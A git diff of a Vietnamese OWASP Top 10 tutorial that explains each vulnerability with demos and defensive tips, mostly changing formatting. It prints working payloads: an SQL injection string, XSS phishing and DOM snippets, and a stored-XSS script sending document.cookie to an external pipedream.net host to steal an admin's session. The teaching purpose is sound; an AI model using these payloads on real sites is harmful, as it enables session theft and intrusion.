@@ -15,6 +15,7 @@
 # TOP 10 OWASP
 
 ## Mục lục:
+
 * [A1:2017 - Injection](#A1)
 * [A2:2017 - Broken Authentication](#A2)
 * [A3:2017-Sensitive Data Exposure](#A3)
@@ -27,6 +28,7 @@
 * [A10:2017-Insufficient Logging & Monitoring](#A10)
 
 <a name = "A1"></a>
+
 # A1:2017 - Injection
 
 - Bất cứ 1 attacker nào cũng có thể truy cập trái phép database thông qua các form, ô input cần dữ liệu nhập vào phía client để truy cập tới database.
@@ -35,11 +37,11 @@
 - Truy cập dữ liệu bất hợp pháp bằng 1 số query như SELECT để lấy ra dữ liệu của database.
 - Thực hiện các query như Insert/Update để thêm hoặc sửa các thông tin trên database 1 cách bất hợp pháp.
 - 1 số phương pháp để tránh lỗi injection:
-	+ Lọc dữ liệu client nhập vào 1 các cẩn thận. Lọc hết các ký đặc biệt và các từ khoá trong SQL.
-	+ Bỏ qua các cộng chuỗi để tạo ra các câu query.
-	+ Không hiện thị lỗi chi tiết nếu phía client nhập sai.
-	+ Phân quyền trong database 1 cách rõ ràng. Dùng table nào thì gán quyền truy cập table đó, tránh khả năng nếu user có thể inject vô cũng không thể chuyển qua truy cập table khác trong database.
-	+ Backup dữ liệu thường xuyên đề phòng dữ liệu bị mất, đừng quá tự tin về phần bảo mật của chính mình.
+  + Lọc dữ liệu client nhập vào 1 các cẩn thận. Lọc hết các ký đặc biệt và các từ khoá trong SQL.
+  + Bỏ qua các cộng chuỗi để tạo ra các câu query.
+  + Không hiện thị lỗi chi tiết nếu phía client nhập sai.
+  + Phân quyền trong database 1 cách rõ ràng. Dùng table nào thì gán quyền truy cập table đó, tránh khả năng nếu user có thể inject vô cũng không thể chuyển qua truy cập table khác trong database.
+  + Backup dữ liệu thường xuyên đề phòng dữ liệu bị mất, đừng quá tự tin về phần bảo mật của chính mình.
 
 ## Demo với sql injection cơ bản
 
@@ -56,16 +58,20 @@
 - Trang web này chỉ là trang web đơn giản bị lỗi sql injection do dev không kiểm tra kỹ càng về phía đầu vào của client
 - Ở đây dev chỉ giả định client sẽ nhập những tên sách để xuất ra thông tin của sách, nhập không đúng thì xuất ra bảng rỗng.
 - Giả sử ở phía attacker không nhập vào tên sách mà nhập các query sql, ta hãy thử phân tích câu query mà dev sử dụng để truy vấn cơ sở dữ liệu.
-```
+
+```php
 $sql_stmt = 'SELECT * FROM book WHERE BOOK = "'.$search.'"';
 ```
+
 - Ở đây `$search` là đầu vào ở phía client sẽ nhập vào.
 - Có thể thấy rõ câu query trên sử dụng cộng các str lỏng lẻo. attacker có thể nhập câu query `" OR "1" = "1` để chình sửa lại ý nghĩa câu query của dev như sau:
-```
+
+```php
 $sql_stmt = 'SELECT * FROM book WHERE BOOK = "" OR "1" = "1"';
 ```
+
 - Ta hãy phân tích câu query sau:
-    + Ở đây với ý nghĩa ban đầu là sẽ lấy ra tất cả dữ liệu của tên BOOK được nhập vào. Sau đó bị attacker thêm vào câu query kia khiến ý nghĩa bị thay đổi. Bây giờ bị biến thành lấy tất cả dữ liệu của tên BOOK hoặc `"1" = "1"`. Ta có thể thấy, đó là trường hợp luôn đúng. Vậy nên Cơ sở dữ liệu sẽ trả lại cho attacker tất cả những gì đang có trong bảng.
+  + Ở đây với ý nghĩa ban đầu là sẽ lấy ra tất cả dữ liệu của tên BOOK được nhập vào. Sau đó bị attacker thêm vào câu query kia khiến ý nghĩa bị thay đổi. Bây giờ bị biến thành lấy tất cả dữ liệu của tên BOOK hoặc `"1" = "1"`. Ta có thể thấy, đó là trường hợp luôn đúng. Vậy nên Cơ sở dữ liệu sẽ trả lại cho attacker tất cả những gì đang có trong bảng.
 
 ![demo](images/3.png)
 
@@ -74,20 +80,22 @@ $sql_stmt = 'SELECT * FROM book WHERE BOOK = "" OR "1" = "1"';
 ![show all](images/show_all_injection.png)
 
 <a name = "A2"></a>
+
 # A2:2017 - Broken Authentication
 
 - Ngay từ form register, nếu dev không quản lý chặt chẽ để user register với 1 username và password ngắn, dễ đoán. Rất có thể tài khoản đó có thể bị tấn công và bị chiếm quyền truy cập bất cứ lúc nào.
 - Ở form login, nếu dev không kiểm tra xác thực đúng cách, 1 attacker nào đó có thể truy cập vào 1 tài khoản nào đó thông qua 1 số tool Credential stuffing với 1 whitelist username và password. Với cách nhập tay thì khó có thể truy cập vào 1 tài khoản 1 cách trái phép, nhưng với tool có thể quét vài nghìn lần trong vài giây thì sao, liệu 1 tài khoản với username và password ngắn và lỏng lẻo liệu có thể thoát được.
 - Vài hướng để bảo vệ user khỏi Broken Authentication:
-	+ Bắt user tạo mật khẩu đủ dài, tối thiểu phải đạt 8 ký tự. Ngoài ra phải có 1 ký tự viết hoa, 1 ký tự đặc biệt, 1 chữ số tuỳ theo trường hơp
-	+ Trong khi login nếu user nhập sai username hoặc password thì trả về kết quả đã nhập sai username hoặc password. Không thông báo đã nhập sai phần nào
-	+ Username và password khi được lưu vào database cần phải được mã hoá
-	+ Vô hiệu hoá nếu vượt qua số lần login cho phép
-	+ Thêm 1 số yêu cầu khác như capcha để hạn chế xác thực qua các tool
+  + Bắt user tạo mật khẩu đủ dài, tối thiểu phải đạt 8 ký tự. Ngoài ra phải có 1 ký tự viết hoa, 1 ký tự đặc biệt, 1 chữ số tuỳ theo trường hơp
+  + Trong khi login nếu user nhập sai username hoặc password thì trả về kết quả đã nhập sai username hoặc password. Không thông báo đã nhập sai phần nào
+  + Username và password khi được lưu vào database cần phải được mã hoá
+  + Vô hiệu hoá nếu vượt qua số lần login cho phép
+  + Thêm 1 số yêu cầu khác như capcha để hạn chế xác thực qua các tool
 - Password đủ dài và đủ khó chưa phải là tất cả, cần phải lưu ý về phần cookies và session :
-	+ Set thời gian sống cho cookies và session của user thấp
-	+ Tạo phiên khi user login và xoá phiên khi user logout
-	+ Hạn chế gửi thông tin đăng nhập của user qua các kết nối không được mã hoá. Khi gửi qua http không có SSL rất có thể bị sniper dữ liệu.
+  + Set thời gian sống cho cookies và session của user thấp
+  + Tạo phiên khi user login và xoá phiên khi user logout
+  + Hạn chế gửi thông tin đăng nhập của user qua các kết nối không được mã hoá. Khi gửi qua http không có SSL rất có thể bị sniper dữ liệu.
+
 ## Sơ bộ về Web demo
 
 ![broken](images/Broken_1.png)
@@ -111,6 +119,7 @@ $sql_stmt = 'SELECT * FROM book WHERE BOOK = "" OR "1" = "1"';
 ![wp](images/wp.png)
 
 <a name = "A3"></a>
+
 # A3:2017 - Sensitive Data Exposure
 
 - Các dữ liệu nhạy cảm như thông tin cá nhân người dùng, số tài khoản tín dụng, mật khẩu không được lưu trữ và bảo vệ cẩn thận.
@@ -118,8 +127,8 @@ $sql_stmt = 'SELECT * FROM book WHERE BOOK = "" OR "1" = "1"';
 - Các dữ liệu nhạy cảm khi lưu ở trong file không được mã hoá và bao gồm các file backup khác có thể bị attacker truy cập trái phép
 - Không dùng các thuật toán mã hoá yếu, có lỗ hổng dễ giải mã.
 - 1 số lỗi thường gặp: 
-	+ Cleartext Storage of Sensitive Information
-	+ Cleartext Transmission of Sensitive Information
+  + Cleartext Storage of Sensitive Information
+  + Cleartext Transmission of Sensitive Information
 
 ## Sơ bộ về web demo
 
@@ -150,10 +159,12 @@ $sql_stmt = 'SELECT * FROM book WHERE BOOK = "" OR "1" = "1"';
 ![test](images/upload_basic.png)
 
 <a name = "A4"></a>
+
 # A4:2017 - XML External Entities (XXE)
 
 - XML được sử dụng để trao đổi dữ liệu giữa các ứng dụng khác nhau.
 - Kỹ thuật tấn công XXE dựa vào việc cho phép khai báo External Entity trong phần DTD của dữ liệu XML, attacker có thể khai báo một entity để đọc nội dung của file bất kỳ trong hệ thống nếu trình phân tích XML được cấu hình không tốt.
+
 ## Demo tấn công và sơ lược về web demo
 
 ![demo](images/XML_demo.png)
@@ -167,6 +178,7 @@ $sql_stmt = 'SELECT * FROM book WHERE BOOK = "" OR "1" = "1"';
 - Giải thích sơ lược về file php dùng để gửi requests chứa phần External Entity độc hại: **there will be a day not far away**
 
 <a name = "A5"></a>
+
 # A5:2017 - Broken Access Control
 
 - Do thiếu sót của dev trong quá trình xây dựng quyền cho user, dẫn đến các cuộc tấn công leo quyền của attacker từ vị trí của user.
@@ -183,6 +195,7 @@ $sql_stmt = 'SELECT * FROM book WHERE BOOK = "" OR "1" = "1"';
 ![index](images/ACESS_index.png)
 
 <a name = "A6"></a>
+
 # A6:2017 - Security Misconfiguration
 
 - Do việc cấu hình an ninh lỏng lẻo tại webserver, database, … khiến cho attacker có thể khai thác vào các ứng dụng, để lộ ra những thông tin quan trọng khi trao đổi thông tin.
@@ -200,27 +213,30 @@ $sql_stmt = 'SELECT * FROM book WHERE BOOK = "" OR "1" = "1"';
 ![Directory traversal](images/a6_secret.png)
 
 <a name = "A7"></a>
+
 # A7:2017 - Cross-Site Scripting (XSS)
 
 - XSS (Cross-site Scripting) là một lỗ hổng phổ biến trong ứng dụng web. Để khai thác một lỗ hổng XSS, attacker sẽ chèn mã độc thông qua các đoạn script để thực thi chúng ở phía client. Thông thường, các cuộc tấn công XSS được sử dụng để vượt qua các kiểm soát truy cập và mạo danh người dùng.
 
 - XSS thường có 3 loại:
-	+ Reflected XSS
-	+ Stored XSS
-	+ DOM-based XSS
+  + Reflected XSS
+  + Stored XSS
+  + DOM-based XSS
 
 ## Reflected XSS
 
 - Ở dạng tấn công này, attacker sẽ chèn mã độc vào URL và lừa victim click vào. Lúc này khi nạn nhân click vào URL, trang web sẽ đọc đoạn mã độc của attacker đã đưa vào URL và thực thi chúng.
 - Các kiểu tấn công ở dạng này tương đối đa dạng, tuỳ thuộc vào attacker. Tuy nhiên, tầm ảnh hưởng chỉ riêng victim mà attacker nhắm vào.
 - Bình thường attacker sẽ có gắng lấy cookie của người dùng hoặc admin để truy cập bất hợp pháp. Tuy nhiên, ở đây attacker cũng có thể kết hợp kỹ thuật Phishing để lừa nạn nhân. Ví dụ:
-+B1: attacker sẽ tạo URL như sau tạo web abc.com nào đó: 
-` http://abc.com?q=<script>alert('You are rewarded by abc.com program, please call the +882xxxxxxxx number for more information')</script> `
-+B2: Bằng cách nào đó attacker dụ được victim click vào link đó.
+  +B1: attacker sẽ tạo URL như sau tạo web abc.com nào đó: 
+  ` http://abc.com?q=<script>alert('You are rewarded by abc.com program, please call the +882xxxxxxxx number for more information')</script> `
+  +B2: Bằng cách nào đó attacker dụ được victim click vào link đó.
+
 + Lúc này, khi victim click vào link đó và gửi request về sever, sever sẽ thực thi đoạn mã độc đó và trả về cho victim 1 popup xuất hiện thông báo sau.
 
 ![popup](images/popup.png)]
 	
+
 + Giả sử SDT `+882xxxxxxxx` là SDT vệ tinh, phí gọi có thể vào 150k/phút chẳng hạn. Lúc này nếu victim "ngây thơ" gọi cho SDT đó thì có thể tài khoản điện thoại bay sạch cũng nên.
 
 - Sự nguy hiểm của Reflected XSS tuy rất lớn, nhưng chung quy lại chỉ ảnh hưởng tới 1 số user nhất định. Vì vậy ngoại trừ cố gắng phòng thủ trước lỗi XSS này, dev cần đính chính cho user để tránh bị lừa oan. 
@@ -231,8 +247,8 @@ $sql_stmt = 'SELECT * FROM book WHERE BOOK = "" OR "1" = "1"';
 - Với kỹ thuật Stored XSS, attacker không khai thác trực tiếp mà phải thực hiện tối thiểu qua 2 bước.
 - Đầu tiên attacker sẽ thông qua các điểm đầu vào (form, input, textarea…) không được kiểm tra kỹ để chèn vào CSDL các đoạn mã nguy hiểm. Tiếp theo, khi victim truy cập vào ứng dụng web và thực hiện các thao tác liên quan đến dữ liệu được lưu này, đoạn mã của attacker sẽ được thực thi trên trình duyệt victim.
 - Reflected XSS và Stored XSS có 2 sự khác biệt lớn trong quá trình tấn công:
-	+ Thứ nhất, để khai thác Reflected XSS, attacker phải lừa được victim truy cập vào URL của mình. Còn Stored XSS không cần phải thực hiện việc này, sau khi chèn được mã nguy hiểm vào CSDL của ứng dụng, attacker chỉ việc ngồi chờ victim tự động truy cập vào. Với victim, việc này là hoàn toàn bình thường vì họ không hề hay biết dữ liệu mình truy cập đã bị nhiễm độc.
-	+ Thứ 2, mục tiêu của attacker sẽ dễ dàng đạt được hơn nếu tại thời điểm tấn công victim vẫn trong phiên làm việc(session) của ứng dụng web. Với Reflected XSS, attacker có thể thuyết phục hay lừa victim đăng nhập rồi truy cập đến URL mà hắn ta cung cấp để thực thi mã độc. Nhưng Stored XSS thì khác, vì mã độc đã được lưu trong CSDL Web nên bất cứ khi nào victim truy cập các chức năng liên quan thì mã độc sẽ được thực thi, và nhiều khả năng là những chức năng này yêu cầu phải xác thực(đăng nhập) trước nên hiển nhiên trong thời gian này victim vẫn đang trong phiên làm việc.
+  + Thứ nhất, để khai thác Reflected XSS, attacker phải lừa được victim truy cập vào URL của mình. Còn Stored XSS không cần phải thực hiện việc này, sau khi chèn được mã nguy hiểm vào CSDL của ứng dụng, attacker chỉ việc ngồi chờ victim tự động truy cập vào. Với victim, việc này là hoàn toàn bình thường vì họ không hề hay biết dữ liệu mình truy cập đã bị nhiễm độc.
+  + Thứ 2, mục tiêu của attacker sẽ dễ dàng đạt được hơn nếu tại thời điểm tấn công victim vẫn trong phiên làm việc(session) của ứng dụng web. Với Reflected XSS, attacker có thể thuyết phục hay lừa victim đăng nhập rồi truy cập đến URL mà hắn ta cung cấp để thực thi mã độc. Nhưng Stored XSS thì khác, vì mã độc đã được lưu trong CSDL Web nên bất cứ khi nào victim truy cập các chức năng liên quan thì mã độc sẽ được thực thi, và nhiều khả năng là những chức năng này yêu cầu phải xác thực(đăng nhập) trước nên hiển nhiên trong thời gian này victim vẫn đang trong phiên làm việc.
 - Từ những điều này có thể thấy Stored XSS nguy hiểm hơn Reflected XSS rất nhiều, đối tượng bị ảnh hưởng có thế là tất cả nhưng người sử dụng ứng dụng web đó. Và nếu victim có vai trò quản trị thì còn có nguy cơ bị chiếm quyền điều khiển web.
 
 ## DOM Based XSS
@@ -243,13 +259,15 @@ $sql_stmt = 'SELECT * FROM book WHERE BOOK = "" OR "1" = "1"';
 ![form](images/form_bth.png)
 
 - Bây giờ attacker sẽ đổi tham số q của form thành:
-	```
-	<select onchange="show()">
+
+  ```php+HTML
+  <select onchange="show()">
            <option value="Male">Male</option>
            <option value="Female">Female</option>
-      </select>
-      <script>function show(){alert('hacked');}</script>
-	```
+  </select>
+  <script>function show(){alert('hacked');}</script>
+  ```
+
 - Sau khi thêm đoạn mã độc vào form, bây giờ form sẽ thành:
 
 ![form](images/form_q.png)
@@ -276,12 +294,13 @@ $sql_stmt = 'SELECT * FROM book WHERE BOOK = "" OR "1" = "1"';
 - Ở đây trang Edit để thêm ảnh vào trang web gồm 1 nút button để thêm ảnh, 1 ô input để nhập name account, 1 ô input để thêm subject, 1 ô input tiếp theo để thêm messenger cho amdin.
 - Bây giờ attacker bắt đầu thêm ảnh. với 3 ô input đầu thì nhập như bình thường. Tuy nhiên ô messenge thì attacker nhập là:
 
-```
+```javascript
 hello
 <script type="text/javascript">
 	var i=new Image; i.src='https://eno6x6kni89f.x.pipedream.net?key='+document.cookie;
 </script>
-``` 
+```
+
 - Bây giờ yêu cầu đã được gửi cho admin. Chỉ cần đợi admin vô mục yêu cầu là attacker đã thành công trong việc lấy cookie của admin.
 
 ![ask](images/ask.png)
@@ -294,6 +313,7 @@ hello
 
 
 <a name = "A8"></a>
+
 # A8:2017 - Insecure Deserialization
 
 - Serialization là quá trình chuyển đổi tuần tự một đối tượng object.
@@ -314,12 +334,14 @@ hello
 ![attack3](images/seria_attack3.png)
 
 <a name = "A9"></a>
+
 # A9:2017 - Using Components with Known Vulnerabilities
 
 - Do việc sử dụng mà không kiểm duyệt các thư viện, plugin, module, ứng dụng… có tồn tại các lỗ hổng đã được công khai, từ đó attacker có thể lợi dụng để tấn công vào hể thống và thực hiện các mục đích xấu.
 - attacker có thể khai thác các lỗ hổng để thực hiện các hành vi xấu như đánh cắp các dữ liệu nhạy cảm, chiếm quyền server,…
 
 <a name = "A10"></a>
+
 # A10:2017 - Insufficient Logging & Monitoring
 
 - Lỗ này là do khi dev ghi lại logs và kiểm soát phản hồi lỗi không tốt khiến bị rò rỉ thông tin nếu hiển thị các logs và cảnh báo cho người dùng hoặc attacker.
